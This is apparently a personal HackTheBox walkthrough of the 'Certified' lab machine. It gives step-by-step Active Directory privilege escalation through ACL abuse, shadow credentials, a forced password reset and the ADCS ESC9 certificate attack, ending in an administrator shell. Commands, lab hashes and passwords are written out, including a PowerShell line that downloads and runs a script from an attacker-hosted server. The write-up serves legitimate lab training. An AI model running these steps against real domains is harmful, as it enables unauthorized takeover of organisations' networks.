 g-afirst assumed breach scenario from HTB , no nmap this time the name of box is Certified from the name , I would assume the box is related to the ADCS , and the box will be DC 

`judith.mader:judith09`


![[Pasted image 20241104020425.png]]

we already have foothold , I will run bloodhound to hunt for interesting ACLs  


```bash
 nxc ldap 10.129.48.103 -u 'judith.mader' -p judith09 --bloodhound  -c  all  --dns-server 10.129.48.103
```


on bloodhound we can see that our user got some interesting ACLs 
![[Pasted image 20241104021536.png]]


### WriteOwner Abuse

this will allow us to change the owner of the group

first change the owner of group , to our user
```bash
impacket-owneredit -action write -new-owner 'judith.mader' -target 'MANAGEMENT'  certified.htb/'judith.mader':'judith09'
```

![[Pasted image 20241104022215.png]]

now we can grantee add member right to our controlled user 
```bash
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' certified.htb/judith.mader:'judith09'
```

![[Pasted image 20241104022329.png]]

==Note: we can use the .bak file to restore the old state of the user== 

add our user to the Management group 
```bash
net rpc group addmem "MANAGEMENT" "judith.mader" -U "certified.htb"/"judith.mader" -S "10.129.48.103"
```


we can verify , that the operation has been done completed successfully 

```bash
net rpc group members  "MANAGEMENT"  -U "certified.htb"/"judith.mader" -S "10.129.48.103"
```

### GenericWrite

now we are members of `MANAGEMENT` group , so we can abuse `GenericWrite` to take over management_svc  user 

![[Pasted image 20241104023652.png]]

I will use a shadow credential attack 
```bash
certipy shadow auto -u 'judith.mader@certified.htb' -p judith09  -account MANAGEMENT_SVC
```

![[Pasted image 20241104042657.png]]

==I had a CLock skew error , and I fixed using sudo ntpdate TARGET_IP==


### GenericAll

![[Pasted image 20241104042840.png]]

`management_svc` is member of remote management users so we can use `evil-winrm` to  get shell , on the machine 

```bash
evil-winrm -i 10.129.48.103 -H a091c1832bcdd4677c28b5a6a1295584 -u management_svc
```

![[Pasted image 20241104043050.png]]


we can use `GenericAll` to force change password of the `ca_operator` , to do that from  a powershell session , we will need `PowerView.ps1`

```Powershell
iex (New-Object Net.WebClient).DownloadString('http://10.10.14.28:8080/PowerView.ps1')
```

```PowerShell
$UserPassword = ConvertTo-SecureString 'd0s3nt.was.here' -AsPlainText -Force

Set-DomainUserPassword -Identity ca_operator -AccountPassword $UserPassword 
```
 
![[Pasted image 20241104044409.png]]


### ESC9



enumerating for vulnerable template

```bash
certipy find -u 'ca_operator' -p 'd0s3nt.was.here'  -dc-ip 10.129.48.103  -vulnerable -stdout
```

![[Pasted image 20241104044856.png]]

ESC9 allow us to abuse the absence of the strong mapping  , for more check this https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7

to exploit this we need `GenericWrite\GenericAll` over any domain user , we will  use `management_svc` rights over `ca_operator`

update UPN to the administrator 
```bash
certipy account update   -u 'management_svc' -hashes ':a091c1832bcdd4677c28b5a6a1295584' -dc-ip 10.129.48.103 -user ca_operator -upn administrator@certified.htb
```

request a certificate using the `ca_operator` , the Upn we modified earlier will be used to map the certificate , so it will be issued with administrator privileges 
```bash
certipy req  -u 'ca_operator' -p d0s3nt.was.here  -dc-ip 10.129.48.103 -template CertifiedAuthentication -ca certified-DC01-CA
```

![[Pasted image 20241104045540.png]]

reset the Upn back , if we didn't reset it we will have problems using certificate to authenticate 

```bash
certipy account update   -u 'management_svc' -hashes 'a091c1832bcdd4677c28b5a6a1295584' -dc-ip 10.129.48.103 -user ca_operator -upn ca_operator@certified.htb
```



```bash
certipy auth -pfx administrator.pfx    -domain certified.htb -dc-ip 10.129.48.103
```

![[Pasted image 20241104045751.png]]



```bash
 impacket-psexec certified.htb/administrator@10.129.48.103 -hashes aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

![[Pasted image 20241104045830.png]]